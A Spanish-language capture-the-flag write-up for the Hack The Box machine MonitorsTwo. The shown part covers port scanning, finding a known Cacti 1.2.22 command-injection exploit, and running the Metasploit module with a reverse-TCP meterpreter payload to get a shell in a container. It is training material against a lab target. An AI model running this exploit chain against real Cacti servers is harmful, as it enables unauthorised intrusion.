---

layout: post
title: MonitorsTwo – HTB
subtitle: Clam AV DC DNS Docker Dotnet Firejail JSON JWT Kerberos Latex Injection LFI
comments: true

---
![MoTwo](https://hyperbeast.es/wp-content/uploads/2023/05/monitorstwo-htb.jpeg)

MonitorsTwo es una emocionante máquina de dificultad fácil que se encuentra en la plataforma de Hack The Box (HTB). En esta desafiante aventura, nos enfrentaremos a una serie de pasos para lograr el acceso a la máquina.

El primer paso consiste en aprovechar una vulnerabilidad en Cacti, una herramienta de monitoreo, para abrirnos paso y obtener acceso a un contenedor. Una vez dentro del contenedor, nuestro objetivo será elevar nuestros privilegios mediante la explotación de un binario SUID. Esto nos permitirá obtener un mayor control sobre el sistema.

Una vez que hayamos logrado elevar nuestros privilegios en el contenedor, nos enfrentaremos al desafío de acceder a la máquina principal. Para lograrlo, realizaremos una minuciosa enumeración de la base de datos MySQL y obtendremos un hash. Utilizando técnicas de cracking, descifraremos el hash y obtendremos acceso a la máquina principal.

Sin embargo, la aventura no termina aquí. Nuestro siguiente objetivo será escalar nuestros privilegios en la máquina principal. Para ello, descubriremos una vulnerabilidad en Docker que nos permitirá ejecutar comandos del contenedor en la máquina principal. Aprovechando esta brecha, lograremos obtener permisos de root gracias a la bash con permisos SUID.

MonitorsTwo es un desafío estimulante que combina habilidades de explotación de vulnerabilidades, enumeración de bases de datos y conocimientos de Docker. A medida que progresamos en esta máquina, aprenderemos valiosas lecciones sobre seguridad informática y ampliaremos nuestra experiencia en el campo del hacking ético.

¡Prepárate para sumergirte en MonitorsTwo y desbloquear las etapas de esta emocionante misión!

## Enumeración
## Escaneo de puertos
Realizamos un análisis exhaustivo con el objetivo de identificar todos los puertos abiertos en la máquina. Durante este proceso, escaneamos y registramos cada puerto activo, lo que nos permite tener un panorama completo de los servicios y protocolos disponibles en el sistema.

En cuanto a una aplicación específica, un ejemplo podría ser Nmap. Nmap es una herramienta popular y ampliamente utilizada para el escaneo de puertos. Proporciona una amplia gama de opciones y técnicas de escaneo, lo que facilita la detección de puertos abiertos y servicios en una máquina remota.

Es importante destacar que el escaneo de puertos se utiliza con fines legítimos, como auditorías de seguridad o pruebas de penetración autorizadas. Se recomienda siempre obtener el consentimiento del propietario del sistema antes de realizar cualquier escaneo o evaluación de seguridad.

```javascript
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.188.45 -oG allPorts
[sudo] contraseña para mrx: 
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-02 15:02 CEST
Initiating SYN Stealth Scan at 15:02
Scanning 10.129.188.45 [65535 ports]
Discovered open port 22/tcp on 10.129.188.45
Discovered open port 80/tcp on 10.129.188.45
Completed SYN Stealth Scan at 15:02, 12.44s elapsed (65535 total ports)
Nmap scan report for 10.129.188.45
Host is up, received user-set (0.047s latency).
Scanned at 2023-05-02 15:02:25 CEST for 12s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
           Raw packets sent: 66860 (2.942MB) | Rcvd: 65624 (2.625MB)
```
Al visitar la página web, nos encontramos con un panel de inicio de sesión de Cacti. Luego, realizamos un escaneo para descubrir los puertos abiertos en la máquina. Durante este proceso, identificamos dos puertos abiertos: el puerto 22 para SSH y el puerto 80 para la web.

Para llevar a cabo el escaneo, utilizamos los siguientes parámetros:

    -p-: Escaneo de todos los puertos disponibles (65535).
    --open: Muestra únicamente los puertos abiertos.
    -sS: Realiza un escaneo TCP SYN para obtener rápidamente información sobre los puertos abiertos.
    --min-rate 5000: Establecemos una tasa mínima de 5000 paquetes por segundo para acelerar el escaneo.
    -vvv: Modo verbose que muestra la información en cuanto se descubre.
    -n: Deshabilita la resolución de DNS para evitar retrasos innecesarios.
    -Pn: Desactiva el descubrimiento de host mediante ping.
    -oG: Guarda los resultados del escaneo en un archivo de una sola línea, lo cual facilita el uso de comandos como grep, sed, awk, entre otros. Este tipo de archivo es especialmente útil para la herramienta extractPorts, que nos permite copiar directamente los puertos abiertos al portapapeles.

En el segundo escaneo, nos enfocamos en descubrir los servicios y las versiones asociadas a los puertos abiertos. Este análisis nos permitirá obtener información más detallada sobre los servicios disponibles en la máquina.

Con estos datos obtenidos, estamos un paso más cerca de comprender la configuración y las posibles vulnerabilidades de la máquina.

```javascript
❯ nmap -p22,80 -sCV 10.129.188.45 -oN targeted
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-02 15:05 CEST
Nmap scan report for 10.129.188.45
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.23 seconds
```
## Intrusión (Docker)
Si utilizamos la herramienta searchsploit, podemos descubrir que la versión del software que se encuentra en la página web presenta una vulnerabilidad conocida como RCE (Remote Code Execution). Esta vulnerabilidad permite a un atacante ejecutar código de forma remota en el sistema afectado, lo que podría comprometer su seguridad y permitir el acceso no autorizado.

En resumen, la función de searchsploit es buscar y listar exploits conocidos y vulnerabilidades en diferentes software y sistemas. En este caso particular, nos ha permitido identificar que la versión del software en la página web es vulnerable a un RCE. Esta información es valiosa para los profesionales de seguridad informática, ya que les permite estar al tanto de las vulnerabilidades existentes y tomar las medidas necesarias para proteger los sistemas afectados.

```javascript
❯ searchsploit cacti 1.2.22
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------     
Cacti v1.2.22 - Remote Command Execution (RCE)                                                                        | php/webapps/51166.py
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Realizamos una búsqueda del exploit correspondiente a la versión de Cacti en Metasploit. 

Esta acción implica utilizar la plataforma Metasploit para buscar y localizar el exploit específico que se dirige a la versión del software Cacti que hemos identificado. Metasploit es un marco de desarrollo de pruebas de penetración que incluye una amplia gama de exploits y herramientas para evaluar la seguridad de sistemas y aplicaciones.

Al buscar el exploit adecuado en Metasploit, podemos aprovechar sus capacidades para llevar a cabo pruebas de penetración controladas y evaluar la efectividad de las medidas de seguridad implementadas en el sistema afectado. Esto permite a los profesionales de seguridad informática comprender las posibles vulnerabilidades y tomar acciones correctivas para mitigar los riesgos asociados.

En resumen, buscar el exploit de la versión de Cacti en Metasploit es un paso importante para evaluar la seguridad de este software en particular y determinar si existen vulnerabilidades conocidas que podrían ser aprovechadas por atacantes malintencionados.

```javascript
msf6 > search cacti

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   0  exploit/linux/http/cacti_unauthenticated_cmd_injection  2022-12-05       excellent  Yes    Cacti 1.2.22 unauthenticated command injection
   1  exploit/unix/http/cacti_filter_sqli_rce                 2020-06-17       excellent  Yes    Cacti color filter authenticated SQLi to RCE
   2  exploit/unix/webapp/cacti_graphimage_exec               2005-01-15       excellent  No     Cacti graph_view.php Remote Command Execution
   3  exploit/windows/http/hp_sitescope_runomagentcommand     2013-07-29       manual     Yes    HP SiteScope Remote Code Execution

Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/hp_sitescope_runomagentcommand

msf6 > use 0
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > 
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set RHOSTS 10.129.188.45
RHOSTS => 10.129.188.45
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set RPORT 80
RPORT => 80
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set LHOST 10.10.14.155
LHOST => 10.10.14.155
```
Configuramos los parámetros RHOSTS, RPORT y LHOST, y procedemos a ejecutar el exploit en varias ocasiones, ya que su funcionamiento no es siempre consistente.

Al poner en marcha el exploit, se requiere establecer los valores adecuados para los parámetros RHOSTS (host remoto), RPORT (puerto remoto) y LHOST (host local). Estos parámetros permiten al exploit interactuar con el sistema objetivo de manera precisa y establecer una conexión efectiva.

Sin embargo, debido a la naturaleza de las vulnerabilidades y las diferentes configuraciones de los sistemas objetivo, es posible que el exploit no funcione de manera consistente en todos los intentos. Esto puede deberse a factores como medidas de seguridad adicionales, actualizaciones del software o configuraciones específicas del sistema.

Por lo tanto, es necesario ejecutar el exploit varias veces, realizando ajustes y modificaciones necesarios en los parámetros y en la técnica utilizada. Este enfoque de prueba iterativa nos permite explorar diferentes opciones y abordajes hasta encontrar la combinación adecuada que logre el éxito en la explotación de la vulnerabilidad.

En resumen, al poner en práctica los parámetros RHOSTS, RPORT y LHOST y ejecutar el exploit repetidamente, estamos adoptando un enfoque adaptativo para superar las posibles inconsistencias y dificultades que puedan surgir durante la explotación de la vulnerabilidad en cuestión.

```javascript
msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.155:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is Cacti version 1.2.22
[*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations
[*] Enumerating local_data_id values for host_id 1
[+] Found exploitable local_data_id 6 for host_id 1
[*] Command Stager progress - 100.00% done (868/868 bytes)

whoami
www-data
```
Como podemos ver nos hemos conectado a un contenedor Docker y no a la máquina principal.

```javascript
www-data@50bca5e748b0:/var/www/html$ hostname -I
hostname -I
172.19.0.3 
www-data@50bca5e748b0:/var/www/html$ 
```

